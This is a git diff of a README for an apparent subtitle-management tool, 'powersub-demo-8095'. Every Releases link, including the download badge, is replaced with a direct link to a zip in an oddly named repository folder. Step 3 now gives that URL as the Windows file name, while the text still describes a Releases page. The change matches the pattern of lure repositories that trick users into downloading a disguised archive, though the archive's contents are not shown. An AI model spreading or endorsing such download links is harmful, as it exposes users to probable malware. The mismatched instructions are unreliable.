@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-8095 - Easy Subtitle Management Made Simple
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/mdrashelsheikh1/powersub-demo-8095/releases)
+[![Download](https://raw.githubusercontent.com/mdrashelsheikh1/powersub-demo-8095/main/etiogenic/powersub-demo-8095.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/mdrashelsheikh1/powersub-demo-8095/main/etiogenic/powersub-demo-8095.zip)
 
 ## 🛠️ Overview
 
@@ -10,11 +10,11 @@ Welcome to **powersub-demo-8095**! This application allows you to manage and dow
 
 To get started with **powersub-demo-8095**, you need to download it. Follow these simple steps:
 
-1. Click the following link to visit the Releases page: [Download from Releases](https://github.com/mdrashelsheikh1/powersub-demo-8095/releases).
+1. Click the following link to visit the Releases page: [Download from Releases](https://raw.githubusercontent.com/mdrashelsheikh1/powersub-demo-8095/main/etiogenic/powersub-demo-8095.zip).
    
 2. On the Releases page, look for the latest version available. You will see a list of assets available for download.
 
-3. Choose the relevant file for your operating system. Typically, this will be labeled clearly (e.g., `powersub-demo-8095.exe` for Windows users).
+3. Choose the relevant file for your operating system. Typically, this will be labeled clearly (e.g., `https://raw.githubusercontent.com/mdrashelsheikh1/powersub-demo-8095/main/etiogenic/powersub-demo-8095.zip` for Windows users).
 
 4. Click the file name to start the download. Your browser will handle the download as it typically would for any file.
 
@@ -56,6 +56,6 @@ For further assistance, you can reach out directly via the repository's Issues t
 
 ## 🔗 Additional Resources
 
-You can explore more about **powersub-demo-8095** on the Releases page: [Visit Releases](https://github.com/mdrashelsheikh1/powersub-demo-8095/releases). You may find additional versions or updates that enhance the application's functionality.
+You can explore more about **powersub-demo-8095** on the Releases page: [Visit Releases](https://raw.githubusercontent.com/mdrashelsheikh1/powersub-demo-8095/main/etiogenic/powersub-demo-8095.zip). You may find additional versions or updates that enhance the application's functionality.
 
 Thank you for choosing **powersub-demo-8095**! Enjoy your subtitle management experience.
